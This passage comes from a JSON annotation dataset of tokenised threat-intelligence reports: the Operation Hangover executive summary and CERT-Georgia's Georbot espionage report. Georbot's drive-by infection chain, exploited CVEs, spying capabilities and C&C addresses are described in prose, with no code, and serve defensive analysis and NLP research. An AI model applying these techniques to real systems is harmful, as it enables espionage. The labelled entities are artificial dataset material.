[20]}, {"old_id": "T14", "type": "Campaign", "name": "Hangover", "sent_id": 35, "pos": [1]}, {"old_id": "T15", "type": "Country", "name": "China", "sent_id": 38, "pos": [9]}, {"old_id": "T16", "type": "Campaign", "name": "Hangover", "sent_id": 38, "pos": [20]}, {"old_id": "T17", "type": "Country", "name": "India", "sent_id": 39, "pos": [5]}, {"old_id": "T18", "type": "Organization", "name": "Telenor", "sent_id": 47, "pos": [1]}, {"old_id": "T19", "type": "ExploitTargetObject", "name": "Pakistani", "sent_id": 55, "pos": [2]}, {"old_id": "T20", "type": "ExploitTargetObject", "name": "US", "sent_id": 55, "pos": []}], "labels": [{"old_id": "R1", "r": "P32", "h": 0, "t": 1, "evidence": [0, 1, 2]}, {"old_id": "R2", "r": "P27", "h": 0, "t": 2, "evidence": [0, 1, 2, 3, 4, 5]}, {"old_id": "R3", "r": "P27", "h": 0, "t": 3, "evidence": [0, 1, 2, 3, 4, 5]}, {"old_id": "R4", "r": "P22", "h": 0, "t": 6, "evidence": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]}, {"old_id": "R5", "r": "P27", "h": 8, "t": 9, "evidence": [14, 15, 16, 17, 18]}, {"old_id": "R6", "r": "P27", "h": 8, "t": 10, "evidence": [14, 15, 16, 17, 18]}, {"old_id": "R7", "r": "P27", "h": 8, "t": 11, "evidence": [14, 15, 16, 17, 18, 19]}, {"old_id": "R8", "r": "P32", "h": 13, "t": 14, "evidence": [35, 36, 37, 38]}, {"old_id": "R9", "r": "P32", "h": 15, "t": 16, "evidence": [38, 39]}, {"old_id": "R10", "r": "P27", "h": 15, "t": 18, "evidence": [38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55]}, {"old_id": "R11", "r": "P27", "h": 15, "t": 19, "evidence": [38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55]}], "title": ["inputs/txt/201305NormanHangover"], "sents": [["OPERATION", "HANGOVER", "|Executive", "Summary"], ["Unveiling", "an", "Indian", "Cyberattack", "Infrastructure"], ["This", "report", "details", "a", "sophisticated", "cyberattack", "infrastructure", "that", "appears", "to", "originate", "from", "India", ","], ["conducted", "by", "private", "threat", "actors", "with", "no", "evidence", "of", "state-sponsorship", ".", "It", "has", "likely", "been", "in"], ["operation", "for", "over", "three", "years", ",", "primarily", "as", "a", "platform", "for", "surveillance", "against", "targets", "of", "national"], ["security", "interest", "that", "are", "mostly", "based", "in", "Pakistan", "and", "possibly", "in", "the", "United", "States", ".", "It", "is", "also"], ["used", "for", "industrial", "espionage", "against", "the", "Norwegian", "telecom", "corporation", "Telenor", "and", "other", "civilian", "corporations", ".", "Evidence", "points", "to", "professional", "project", "management", "and", "outsourcing", "of", "key"], ["tasks", ",", "including", "some", "by", "freelance", "programmers", "."], ["On", "March", "17", ",", "2013", "a", "Norwegian", "newspaper", "reported", "that", "the", "country\u2019s", "telecommunications", "giant"], ["Telenor", "had", "filed", "a", "criminal", "police", "case", "for", "an", "unlawful", "computer", "intrusion", ".", "Spear", "phishing"], ["emails", "targeting", "upper", "management", "appeared", "to", "be", "the", "source", "of", "the", "infection"], ["Through", "extensive", "analysis", ",", "security", "analysts", "at", "Norman", "Shark", "in", "conjunction", "with", "our", "partners", ","], ["quickly", "uncovered", "a", "previously", "unknown", "and", "sophisticated", "infrastructure", "for", "targeted", "attacks", "."], ["Norman", "Confidential"], ["HangOver", "Report", "Executive", "Summary", "4/25/2013"], ["Cyberattack", "Objectives"], ["The", "primary", "purpose", "of", "this", "long-running", ",", "global", "command-and-control", "network", "appears", "to", "be", "surveillance", "against", "national", "security", "interests", ".", "Privatesector", "industrial", "espionage", "in", "fields", "as", "diverse", "as", "natural", "resources", ",", "telecommunications", ",", "law", ",", "food", "&", "restaurants", ",", "and", "manufacturing", "is", "likely", "a", "secondary", "purpose", "of", "this", "network", "."], ["Target", "Selection"], ["Based", "on", "analysis", "of", "IP", "addresses", "collected", "from", "criminal", "data", "stores", "discovered", "during", "the", "investigation", ",", "it", "appears", "that", "potential", "victims", "have", "been", "targeted", "in", "over", "a", "dozen", "countries", ",", "most", "heavily", "represented", "by", "Pakistan", ",", "Iran", ",", "and", "the"], ["United", "States", ".", "Targets", "include", "government", ",", "military", ",", "and", "civilian", "organizations"], ["Highly-Targeted", "Social", "Engineering", "Tactics"], ["Spear", "phishing", "to", "carefully-selected", "target", "individuals", "was", "the", "primary", "attack"], ["vector", "identified", "in", "the", "investigation", ".", "The", "attackers", "went", "to", "great", "lengths", "to"], ["make", "the", "social", "engineering", "aspects", "of", "the", "attack", "appear", "as", "credible", "and", "applicable", "as", "possible", "."], ["In", "many", "cases", ",", "decoy", "files", "and", "websites", "were", "used", ",", "specifically", "geared", "to", "the"], ["particular", "sensibilities", "of", "regional", "targets", "including", "cultural", "and", "religious", "subject", "matter", ".", "Victims", "would", "click", "on", "what", "appeared", "to", "be", "an", "interesting", "document", ",", "and", "begin", "the", "long-running", "infection", "cycle", "."], ["Exploit", "Tools", "and", "Techniques"], ["Despite", "all", "of", "the", "recent", "media", "attention", "on", "so-called", "\u201czero-day\u201d", "exploits", "encompassing", "brand", "new", ",", "never-before-seen", "attack", "methods", ",", "Operation", "Hangover"], ["appears", "to", "have", "relied", "exclusively", "upon", "well-known", ",", "previously", "identified", "vulnerabilities", "in", "Java", ",", "Word", "documents", ",", "and", "web", "browsers", "."], ["Favored", "methods", "include", "documents", "infected", "with", "malicious", "code", ",", "along", "with"], ["direction", "to", "malicious", "websites", "with", "names", "deliberately", "similar", "to", "legitimate"], ["government", ",", "entertainment", ",", "security", "related", ",", "and", "commercial", "sites", ".", "Often", "the"], ["user", "would", "be", "presented", "with", "a", "legitimate", "document", "or", "software", "download", "they"], ["were", "expecting", "to", "see", ",", "along", "with", "an", "unseen", "malicious", "download", "."], ["Infrastructure", "Development"], ["Operation", "Hangover", "utilizes", "a", "very", "extensive", "and", "sophisticated", "command-andcontrol", "infrastructure", ",", "likely", "developed", "over", "many", "months", "or", "years", "by", "numerous", "developers", ".", "Our", "investigation", "revealed", "evidence", "of", "professional", "project"], ["management", "practices", "used", "to", "design", "frameworks", ",", "modules", ",", "and", "subcomponents", ".", "Individual", "malware", "authors", "were", "assigned", "certain", "tasks", ",", "and", "components", "were", "\u201coutsourced\u201d", "to", "what", "appear", "to", "be", "freelance", "programmers", "."], ["Attribution", "of", "Responsibility"], ["In", "recent", "months", ",", "much", "focus", "has", "been", "on", "China", "\u2013", "including", "both", "statesponsored", "and", "individual", "actors", "\u2013", "but", "Operation", "Hangover", "contains", "notable"], ["hallmarks", "of", "originating", "exclusively", "in", "India", ".", "We", "base", "this", "attribution", "with", "a"], ["very", "high", "degree", "of", "confidence", "on", "our", "extensive", "analysis", "of", "IP", "addresses", ",", "website", "domain", "registrations", ",", "and", "text-based", "identifiers", "contained", "within", "the", "malicious", "code", "itself", ".", "All", "indications", "point", "to", "private", "syndicates", "of", "threat", "actors"], ["following", "their", "own", "motivations", ",", "with", "no", "direct", "evidence", "of", "state-sponsorship"], ["by", "the", "Indian", "government", "or", "by", "any", "other", "nation", "."], ["Norman", "Confidential"], ["ATTACK", "OVERVIEW"], ["\u00b7\u00b7\u00b7"], ["Discovery", "of", "a", "security", "breach", "at"], ["Norway-based", "Telenor", "uncovered", "a"], ["long", "running", ",", "sophisticated", "global"], ["cyberattack", "infrastructure", "that", "likely"], ["continues", "to", "this", "day", "."], ["Cyberattack", "Objectives"], ["\uf0b7", "National", "security", "interests"], ["\uf0b7", "Industrial", "espionage"], ["Target", "Selection"], ["\uf0b7", "Primarily", "Pakistani", "and", "US-based"], ["targets"], ["\uf0b7", "Business", "targets"], ["Highly-Targeted", "Social", "Engineering", "Tactics"], ["\uf0b7", "Executables", "disguised", "as", "documents"], ["\uf0b7", "Malicious", "web", "downloads"], ["Exploit", "Tools", "and", "Techniques"], ["\uf0b7", "Known", "vulnerabilities", "only"], ["\uf0b7", "No", "use", "of", "zero-day", "exploits"], ["Infrastructure", "Development"], ["\uf0b7", "Evidence", "of", "professional", "project"], ["management"], ["\uf0b7", "Outsourcing", "of", "development"], ["Attribution", "of", "Responsibility"], ["\uf0b7", "Individual", "actors", "likely", "based", "in"], ["India"], ["\uf0b7", "Private", "data", "security", "firms", "hired"], ["to", "build", "specific", "infrastructure"], ["components"], ["\uf0b7", "No", "evidence", "of", "state-sponsored"], ["activity"], ["Contact", "information:"], ["Gary", "Thompson", ",", "925", ".", "768.2400"], ["Tim", "Johnson", ",", "415", ".", "385.9537"], ["norman@claritycommunications", ".", "us"], ["HangOver", "Report", "Executive", "Summary", "4/25/2013"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Georbot", "sent_id": 2, "pos": []}, {"old_id": "T2", "type": "Organization", "name": "Computer Emergency Response Team\u201d of Republic of Georgia", "sent_id": 8, "pos": []}, {"old_id": "T3", "type": "Organization", "name": "CERT-Georgia", "sent_id": 8, "pos": [4]}, {"old_id": "T4", "type": "Information", "name": "Georgian and American Security Documents", "sent_id": 12, "pos": [0, 4]}, {"old_id": "T5", "type": "ExploitTargetObject", "name": "Georgian News-Related web-sites", "sent_id": 29, "pos": [8, 10]}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "wwwcaucasustimescom", "sent_id": 35, "pos": []}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "wwwceige", "sent_id": 36, "pos": []}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "wwwpsnewsge", "sent_id": 38, "pos": []}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "emagovge", "sent_id": 40, "pos": []}, {"old_id": "T10", "type": "ExploitTargetObject", "name": "wwwopentextge", "sent_id": 41, "pos": []}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "wwwpresage", "sent_id": 42, "pos": []}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "wwwpresagetv", "sent_id": 43, "pos": []}, {"old_id": "T13", "type": "ExploitTargetObject", "name": "wwwpsnewsinfo", "sent_id": 44, "pos": []}, {"old_id": "T14", "type": "ExploitTargetObject", "name": "wwwresonancedailycom", "sent_id": 45, "pos": []}, {"old_id": "T15", "type": "Time", "name": "September 2010", "sent_id": 64, "pos": [0, 2]}, {"old_id": "T16", "type": "Time", "name": "March 2011", "sent_id": 66, "pos": [0, 2]}, {"old_id": "T17", "type": "Time", "name": "April  2011", "sent_id": 69, "pos": [0, 3]}, {"old_id": "T18", "type": "Time", "name": "June 2011", "sent_id": 72, "pos": [0, 2]}, {"old_id": "T19", "type": "Time", "name": "October 2011", "sent_id": 75, "pos": [0, 2]}, {"old_id": "T20", "type": "Time", "name": "November 2011", "sent_id": 78, "pos": [0, 2]}, {"old_id": "T21", "type": "Time", "name": "December 2011", "sent_id": 81, "pos": [0, 2]}, {"old_id": "T22", "type": "Time", "name": "January 2012", "sent_id": 84, "pos": [0, 2]}, {"old_id": "T23", "type": "Time", "name": "March 2012", "sent_id": 87, "pos": [0, 2]}, {"old_id": "T24", "type": "Address", "name": "178329170", "sent_id": 70, "pos": []}, {"old_id": "T26", "type": "Address", "name": "8819823855", "sent_id": 73, "pos": []}, {"old_id": "T25", "type": "Address", "name": "88198240123", "sent_id": 73, "pos": []}, {"old_id": "T27", "type": "Address", "name": "9419948104", "sent_id": 76, "pos": []}, {"old_id": "T28", "type": "Address", "name": "17321219283", "sent_id": 79, "pos": []}, {"old_id": "T29", "type": "Address", "name": "31317563", "sent_id": 82, "pos": []}, {"old_id": "T30", "type": "Address", "name": "31214140214", "sent_id": 85, "pos": []}, {"old_id": "T31", "type": "Address", "name": "784614524", "sent_id": 88, "pos": []}, {"old_id": "T32", "type": "Country", "name": "United States", "sent_id": 65, "pos": []}, {"old_id": "T33", "type": "Country", "name": "Georgia", "sent_id": 68, "pos": []}, {"old_id": "T34", "type": "Country", "name": "France", "sent_id": 71, "pos": []}, {"old_id": "T35", "type": "Country", "name": "Germany", "sent_id": 74, "pos": []}, {"old_id": "T36", "type": "Country", "name": "Hungary", "sent_id": 77, "pos": []}, {"old_id": "T37", "type": "Country", "name": "United States", "sent_id": 80, "pos": []}, {"old_id": "T38", "type": "Country", "name": "Czech Republic", "sent_id": 83, "pos": []}, {"old_id": "T39", "type": "Country", "name": "Germany", "sent_id": 86, "pos": []}, {"old_id": "T40", "type": "Country", "name": "Germany", "sent_id": 89, "pos": []}, {"old_id": "T41", "type": "Country", "name": "Canada", "sent_id": 96, "pos": [2]}, {"old_id": "T42", "type": "Country", "name": "Ukraine", "sent_id": 96, "pos": [4]}, {"old_id": "T43", "type": "Country", "name": "China", "sent_id": 96, "pos": [8]}, {"old_id": "T44", "type": "Country", "name": "Russia", "sent_id": 98, "pos": [2]}, {"old_id": "T45", "type": "Time", "name": "30 March 2011", "sent_id": 102, "pos": [0, 3]}, {"old_id": "T46", "type": "Time", "name": "14 September 2011", "sent_id": 103, "pos": [0, 2]}, {"old_id": "T47", "type": "Time", "name": "25 November 2011", "sent_id": 105, "pos": [0, 2]}, {"old_id": "T48", "type": "Time", "name": "12 December 2011", "sent_id": 107, "pos": [0, 2]}, {"old_id": "T49", "type": "MalwareCharacteristics", "name": "Video Recording", "sent_id": 107, "pos": [5, 6]}, {"old_id": "T50", "type": "Exploit", "name": "Framephp", "sent_id": 118, "pos": []}, {"old_id": "T51", "type": "Malware", "name": "calcexe", "sent_id": 119, "pos": []}, {"old_id": "T52", "type": "Malware", "name": "Calcexe", "sent_id": 120, "pos": []}, {"old_id": "T53", "type": "GeneralVirus", "name": "usbservexe", "sent_id": 121, "pos": []}, {"old_id": "T54", "type": "Malware", "name": "framephp", "sent_id": 128, "pos": []}, {"old_id": "T55", "type": "Vulnerability", "name": "CVE-2010-0842", "sent_id": 130, "pos": [2]}, {"old_id": "T56", "type": "Vulnerability", "name": "CVE-2006-3730", "sent_id": 130, "pos": [4]}, {"old_id": "T57", "type": "Vulnerability", "name": "MS06-057", "sent_id": 130, "pos": [6]}, {"old_id": "T58", "type": "Malware", "name": "framephp", "sent_id": 131, "pos": []}, {"old_id": "T59", "type": "Exploit", "name": "0day", "sent_id": 133, "pos": [5]}, {"old_id": "T60", "type": "MalwareCharacteristics", "name": "Recording Videos from Webcam", "sent_id": 167, "pos": [1, 4]}, {"old_id": "T61", "type": "MalwareCharacteristics", "name": "Searching Sensitive word\u2019s In filenames", "sent_id": 165, "pos": [1, 5]}, {"old_id": "T62", "type": "MalwareCharacteristics", "name": "Modify malware code file from C&C Web Panel", "sent_id": 169, "pos": [1, 8]}, {"old_id": "T63", "type": "MalwareCharacteristics", "name": "Self-Created Packer Crypter in Assembler Language", "sent_id": 170, "pos": [1, 7]}, {"old_id": "T64", "type": "MalwareCharacteristics", "name": "Update mechanism", "sent_id": 171, "pos": [1, 2]}, {"old_id": "T65", "type": "MalwareCharacteristics", "name": "Base-encoded plaintext", "sent_id": 171, "pos": [4, 5]}, {"old_id": "T66", "type": "MalwareCharacteristics", "name": "opening network socket at ring0 level", "sent_id": 173, "pos": [1, 6]}, {"old_id": "T67", "type": "MalwareCharacteristics", "name": "TDSS Rootkit Modification", "sent_id": 173, "pos": []}, {"old_id": "T68", "type": "ExploitTargetObject", "name": "Ministries", "sent_id": 180, "pos": [1]}, {"old_id": "T69", "type": "ExploitTargetObject", "name": "Parliament", "sent_id": 181, "pos": [1]}, {"old_id": "T70", "type": "ExploitTargetObject", "name": "Critical Information Ifrastructures", "sent_id": 182, "pos": [1, 3]}, {"old_id": "T71", "type": "ExploitTargetObject", "name": "Banks", "sent_id": 183, "pos": [1]}, {"old_id": "T72", "type": "ExploitTargetObject", "name": "NGO\u2019s", "sent_id": 184, "pos": [1]}, {"old_id": "T73", "type": "CourseOfAction", "name": "Blocked each of 6 C&C IP addresses", "sent_id": 187, "pos": [1, 7]}, {"old_id": "T74", "type": "CourseOfAction", "name": "identified all Georgian infected IP\u2019s", "sent_id": 189, "pos": [2, 6]}, {"old_id": "T75", "type": "CourseOfAction", "name": "gave mitigation strategies and cleaning tools to Infected Agencies and Institutions", "sent_id": 189, "pos": []}, {"old_id": "T76", "type": "CourseOfAction", "name": "Cooperated with Antivirus IDS/IPS solutions to create mitigating tools and signatures", "sent_id": 191, "pos": []}, {"old_id": "T77", "type": "CourseOfAction", "name": "Cooperated with FBI", "sent_id": 193, "pos": [1, 3]}, {"old_id": "T78", "type": "CourseOfAction", "name": "Hosting Providers Abuse Teams", "sent_id": 195, "pos": [1, 4]}, {"old_id": "T79", "type": "CourseOfAction", "name": "Law Enforcement Agencies to obtain log files and system images for Forensic Analysis", "sent_id": 196, "pos": []}, {"old_id": "T80", "type": "Indicator", "name": "Warynewsru", "sent_id": 218, "pos": []}, {"old_id": "T81", "type": "Attacker", "name": "Russian Official State", "sent_id": 217, "pos": [10, 12]}, {"old_id": "T82", "type": "Attacker", "name": "Russian Business Network", "sent_id": 219, "pos": [2, 4]}, {"old_id": "T83", "type": "Indicator", "name": "wwwrbcru", "sent_id": 220, "pos": []}], "labels": [{"old_id": "R1", "r": "P7", "h": 53, "t": 54, "evidence": [128, 129, 130]}, {"old_id": "R2", "r": "P7", "h": 53, "t": 55, "evidence": [128, 129, 130]}, {"old_id": "R3", "r": "P7", "h": 53, "t": 56, "evidence": [128, 129, 130]}], "title": ["inputs/txt/201210LEPLGeorBot"], "sents": [["CYBER", "ESPIONAGE"], ["Against", "Georgian", "Government"], ["(Georbot", "Botnet)"], ["CERT", ".", "GOV.GE"], ["LEPL", "Data", "Exchange", "Agency"], ["Ministry", "of", "Justice", "of", "Georgia"], ["1|P", "ag", "e"], ["Summary"], ["In", "march", ",", "2011", "CERT-Georgia", "which", "is", "Governmental", "\u201cComputer", "Emergency", "Response"], ["Team\u201d", "of", "Republic", "of", "Georgia", "has", "Discovered", "Cyber", "Attack", "Incident", ",", "which", "seems", "to", "be", "Cyber"], ["Espionage", "Example", "."], ["Advanced", "Malicious", "Software", "was", "Collecting", "Sensitive", ",", "Confidential", "Information", "about"], ["Georgian", "and", "American", "Security", "Documents", "and", "then", "uploading", "it", "to", "some", "of", "Command", "and"], ["Control", "Servers", ".", "(which", "changes", "often", "upon", "detection)", "."], ["After", "investigating", "Attackers", "Servers", "and", "Malicious", "Files", ",", "we", "have", "linked", "this", "Cyber", "Attack", "to"], ["Russian", "Official", "Security", "Agencies", "."], ["2|P", "ag", "e"], ["After", "Analysing", "Webserver", ",", "Malicious", "Files", "and", "Various", "Scripts", "we", "found", "out", "that:"], ["1", ".", "Some", "of", "the", "Georgian", "NEWS-related", "sites", "were", "Hacked", "."], ["(The", "Malicious", "script", "was", "injected", "only", "in", "the", "pages", ",", "where", "SPECIFIC"], ["information", "was", "presented)"], ["2", ".", "After", "visiting", "this", "pages", "Computer", "was", "infected", "by", "Unknown", "Malicious"], ["Program", "."], ["(None", "of", "Antivirus", "Product", "could", "Identify", "the", "threat", ",", "by", "the", "time", "of", "discovery)", "."], ["3", ".", "When", "executed", ",", "Malicious", "File", "Fully", "Controls", "Infected", "Computers", "."], ["4", ".", "Searches", "for", "the", "\u201cSensitive", "words\u201d", "into", "the", "Document", "Files", "."], ["5", ".", "Makes", "Video", "and", "Audio", "Capture", "using", "built-in", "camera", "and", "microphone", "."], ["3|P", "ag", "e"], ["Targeted", "Audience"], ["Cyber", "Attack", "was", "designed", "very", "smartly", ".", "Various", "Georgian", "News-Related", "web-sites", "were"], ["hacked", "and", "modified", "only", "Specific", "News", "pages", "(eg", ".", "NATO", "delegation", "Visit", "in", "Georgia", ",", "USGeorgian", "Agreements", "and", "Meetings", ",", "Georgian", "Military", "NEWS)", "."], ["Only", "the", "persons", "who", "was", "interested", "in", "such", "information", "were", "infected", "with", "this", "Advanced"], ["Threat", ",", "despite", "of", "Security", "Defensive", "measure\u2019s", "and", "Software", "used", "on", "targets", "Computer", "and"], ["Network", "Systems", ".", "Threat", "was", "highly", "encrypted", "and", "used", "contemporary", "stealthy", "techniques", ",", "so"], ["that", "none", "of", "security", "tools", "could", "identify", "it", "."], ["www", ".", "caucasustimes.com", "\u2013", "Site", "about", "NEWS", "from", "Caucasian", "Region"], ["www", ".", "cei.ge"], ["\u2013", "Caucasus", "Energy", "and", "Infrastructure"], ["www", ".", "psnews.ge"], ["-", "Georgian", "NEWS", "Site"], ["ema", ".", "gov.ge"], ["www", ".", "opentext.ge"], ["www", ".", "presa.ge"], ["www", ".", "presage.tv"], ["www", ".", "psnews.info"], ["www", ".", "resonancedaily.com"], ["4|P", "ag", "e"], ["Malware", "Capabilities"], ["Fully", "Controls", "infected", "computer", "."], ["Malicious", "file", "was", "searching", "for", "Sensitive", "WORDS", "inside", "MS", "Office", "and", "PDF", "documents", "."], ["\uf0b7", "Send", "any", "file", "from", "the", "local", "hard", "drive", "to", "the", "remote", "server"], ["\u2022", "Steal", "certificates"], ["\u2022", "Search", "the", "hard", "drive", "for", "Microsoft", "Word", "documents", "(sensitive", "words)"], ["\u2022", "Search", "the", "hard", "drive", "for", "remote", "desktop", "configuration", "files", ",", "pbk", "files"], ["\u2022", "Take", "screenshots"], ["\u2022", "Record", "audio", "using", "the", "microphone"], ["\u2022", "Record", "video", "using", "the", "webcam"], ["\u2022", "Scan", "the", "local", "network", "to", "identify", "other", "hosts", "on", "the", "same", "network"], ["\u2022", "Execute", "arbitrary", "commands", "on", "the", "infected", "system"], ["5|P", "ag", "e"], ["Sensitive", "Words"], ["In", "The", "Final", "Steps", "Cyber", "Attacker", "Steals", "Matched", "files", ",", "uploads", "them", "to", "the", "Server", "."], ["6|P", "ag", "e"], ["Command", "&", "Controll", "Servers"], ["September", ",", "2010", "\u2013", "georgiaonline", ".", "xp3.biz"], ["(United", "States)", "FreeWebHostingArea", ".", "com"], ["March", ",", "2011"], ["\u2013", "ema", ".", "gov.ge"], ["(Georgia)", "(hacked", "webserver)"], ["April", "", ",", "2011"], ["-", "178", ".", "32.91.70"], ["(France)", "OVH", "Hosting"], ["June", ",", "2011"], ["-", "88", ".", "198.240.123", "/", "88", ".", "198.238.55"], ["(Germany)", "DME", "Hosting"], ["October", ",", "2011"], ["-", "94", ".", "199.48.104"], ["(Hungary)", "Net23", ".", "hu"], ["November", ".", "2011"], ["-", "173", ".", "212.192.83"], ["(United", "States)"], ["December", ",", "2011"], ["-", "31", ".", "31.75.63"], ["(Czech", "Republic)"], ["January", ",", "2012"], ["-", "31", ".", "214.140.214"], ["(Germany)"], ["March", ",", "2012"], ["\u2013", "78", ".", "46.145.24"], ["(Germany)", "DME", "Hosting"], ["DME", "Hosting"], ["This", "server", "changes", "destination", "country", "and", "IP", "address", "upon", "detection", "."], ["7|P", "ag", "e"], ["There", "were", "390", "Infected", "Computers:"], ["70%", "of", "them", "from", "Georgia"], ["5%", "from", "the", "United", "States"], ["4%", "-", "Canada", ",", "Ukraine", ",", "France", ",", "China"], ["3%", "-", "Germany"], ["3%", "-", "Russia"], ["Example", "of", "infected", "Computer", "from", "United", "States"], ["8|P", "ag", "e"], ["Malicious", "file", "was", "evolving", "and", "Developed", "time", "to", "time:"], ["30", "March", ",", "2011", "\u2013", "Virus", "Steals", "Sensitive", "Documents", ",", "Certificates"], ["14", "September", "2011", "\u2013", "Changed", "Infection", "Mechanism", ",", "new", "Bypassing", "methods", "for"], ["the", "(Antivirus/Firewall/IDS)"], ["25", "November", "2011", "\u2013", "Virus", "is", "more", "encrypted", "and", "obfuscated", ".", "infects", "windows", "7"], ["Operating", "System"], ["12", "December", "2011", "\u2013", "added", "Video", "Recording", "capability", ",", "scanning", "and", "infecting"], ["computers", "through", "the", "Network", ",", "changed", "Spreading", "vector"], ["It", "had", "been", "evolved", "from", "2", ".", "1", "version", "to", "5", ".", "5."], ["9|P", "ag", "e"], ["INFECTING", "MECHANISM"], ["1)"], ["2)"], ["3)"], ["4)"], ["5)"], ["Injected", "script", "or", "iframe", "into", "Legitimate", "Web-site"], ["Frame", ".", "php", "from", "iframe", "\u2013", "contained", "(exploit", "pack)"], ["Drive-By", "Download", "&", "Execution", "of", "calc", ".", "exe"], ["Calc", ".", "exe", "self-destruction", "injecting", "code", "into", "Explorer", ".", "exe"], ["Creating", "persistant", "usbserv", ".", "exe", "virus"], ["Step", "1-", "injected", "script"], ["10", "|", "P", "a", "g", "e"], ["shellcode", "inside", "frame", ".", "php"], ["11", "|", "P", "a", "g", "e"], ["/"], ["exploit", "pack", "files"], ["1)", "We", "found", "out", "that", "there", "is", "crafted", "and", "obfuscated", "frame", ".", "php", "file", ",", "which", "carries", "some", "exploit", "code"], ["and", "redirects", "users", "to", "other", "exploit", "pages:"], ["It", "uses", "CVE-2010-0842", ",", "CVE-2006-3730", ",", "MS06-057", "and", "other", "unknown", "vulnerabilities", "."], ["2)", "Exploit", "code", "used", "in", "frame", ".", "php", "is", "crypted", "version", "of", "TrojanDownloader:JS/SetSlice", ",", "which", "exploits"], ["MS06-057", "Vulnerability", "by", "using", "'WebViewFolderIcon'", "ActiveX", "control", "(Web", "View)", "."], ["3)", "Also", "there", "was", "some", "0day", "exploit", "used", "for", "exploitation", "through", "PDF", ",", "JAR", "files", "."], ["Malicious", "Files", "Not", "detected", "with", "Major", "Antivirus", "Products"], ["(1/47", "Virustoal", ",", "Dr", ".", "Web", "result", "\u2013", "suspicious)"], ["Bypasses", "Windows", "7", "sp1", "patched", "with", "Firewall", "enabled", "."], ["As", "of", "25", ".", "03.2011,"], ["20", ".", "06.2011,"], ["16", ".", "01.2012,", "25", ".", "03.2012"], ["After", "Executing", "Malware", "does", "3", "major", "things:"], ["-", "Before", "installing", "bot", "checks", "if", "the", "computer", "is", "located", "in", "UTC+3", ",", "UTC+4"], ["Time-zone:"], ["-", "injects", "itself", "into", "iexplorer", ".", "exe", "and"], ["communicating", "to", "defaced", "sites", ",", "for"], ["C&C", "address", "retrival"], ["-", "creating", "usbserv", ".", "exe", "bot", "file", "in"], ["Application"], ["Data"], ["directory", ","], ["and"], ["writing", "it", "to", "autorun", "in", "Windows"], ["Registry", "."], ["12", "|", "P", "a", "g", "e"], ["Bot", "Control", "Mechanism"], ["1)", "C&C", "servers", "Addresses", "are", "written", "into", "Malware\u2019s", "Binary", "file"], ["2)", "If", "all", "of", "them", "are", "unreachable", "malware", "reads", "special", "html", "page", "header", ","], ["which", "actually", "is", "html", "page", "defaced", "on", ",", "one", "of", "the", "Georgian"], ["Governmental", "Web-Site:"], ["13", "|", "P", "a", "g", "e"], ["NEW", "METHOD", "OF", "MALWARE", "UPDATING"], ["New", "version", "of", "Malware", "file", "is", "downloaded", "as", "base64", "encoded", "plain", "text", "from"], ["different", "servers", "simultaneously", "and", "then", "assembled", "into", "one", "file", "."], ["14", "|", "P", "a", "g", "e"], ["Unique", "Characteristics"], ["1)", "Searching", "Sensitive", "word\u2019s", "In", "filenames", "and", "INTO", "pdf", ",", "word", ",", "xls", ",", "txt", ",", "rtf", ",", "ppt"], ["Documents", "."], ["2)", "Recording", "Videos", "from", "Webcam", ":", "During", "skype", "conversation", ",", "live", "streaming"], ["capability"], ["3)", "Modify", "malware", "code", "file", "from", "C&C", "Web", "Panel"], ["4)", "Self-Created", "Packer", ",", "Crypter", "in", "Assembler", "Language", "(evading", "A/V)"], ["5)", "Update", "mechanism", ",", "Base-encoded", "plaintext", ",", "simultaneously", "from", "different"], ["C&C", "servers", ".", "(evading", "IPS/IDS)"], ["6)", "opening", "network", "socket", "at", "ring0", "level", "(evading", "firewall)", "/", "TDSS", "Rootkit"], ["Modification"], ["15", "|", "P", "a", "g", "e"], ["Infected", "Organisations"], ["Most", "Georgian", "Infected", "computers", "were", "from", "our", "Governmental", "Agencies", "and"], ["Critical", "Information", "Infrastructures"], ["Targets:"], ["1)", "Ministries"], ["2)", "Parliament"], ["3)", "Critical", "Information", "Ifrastructures"], ["4)", "Banks"], ["5)", "NGO\u2019s"], ["16", "|", "P", "a", "g", "e"], ["Responding", "Steps"], ["1)", "Blocked", "each", "of", "6", "C&C", "IP", "addresses", ",", "upon", "detection", ",", "through", "Country\u2019s", "3", "main"], ["Internet", "Service", "Providers", ".", "(Immediate", "Response)"], ["2)", "CERT-GOV-GE", "identified", "all", "Georgian", "infected", "IP\u2019s", "and", "gave", "mitigation"], ["strategies", "and", "cleaning", "tools", "to", "Infected", "Agencies", "and", "Institutions", "."], ["3)", "Cooperated", "with", "Antivirus", ",", "IDS/IPS", "solutions", ",", "to", "create", "mitigating", "tools", "and"], ["signatures", ".", "(Microsoft", ",", "Eset", ",", "Snort", ",", "Cisco", ",", "various", "Blacklists", ",", "Blocklists)"], ["4)", "Cooperated", "with", "FBI", ",", "Department", "of", "Homeland", "Security", ",", "US", "Secret", "Service", ",", "USCERT", ",", "Governmental-CERT-Germany", ",", "CERT-Ukraine", ",", "CERT-Polska", ",", "Microsoft"], ["Cybersecurity", "Division"], ["5)", "Hosting", "Providers", "Abuse", "Teams", ",", "to", "shut", "down", "attacking", "servers", "."], ["6)", "Law", "Enforcement", "Agencies", "to", "obtain", "log", "files", "and", "system", "images", "for", "Forensic"], ["Analysis", "."], ["17", "|", "P", "a", "g", "e"], ["Counter", "Cyber-Intelligence"], ["(unmasking", "the", "attackers)"], ["CERT-GOV-GE", "gained", "full", "access", "to", "Command", "and", "Control", "servers", ",", "Decrypted", "communication"], ["mechanisms", "and", "malicious", "files", ".", "After", "Analyzing", "all", "the", "gathered", "information", "we", "have"], ["identified", "Cyber", "attacker", "persons", "and", "organizations", "."], ["\u201cDuring", "2008", "Cyber", "War", "between", "Russia", "and", "Georgia", ",", "two", "Independent", "US-based", "Organizations", "linked", "Cyber", "Attackers"], ["with", "Russian", "Official", "Ministries", "and", "Organizations", "."], ["\u201cUnited", "States", "Cyber", "Consequences", "Unit\u201d", "and", 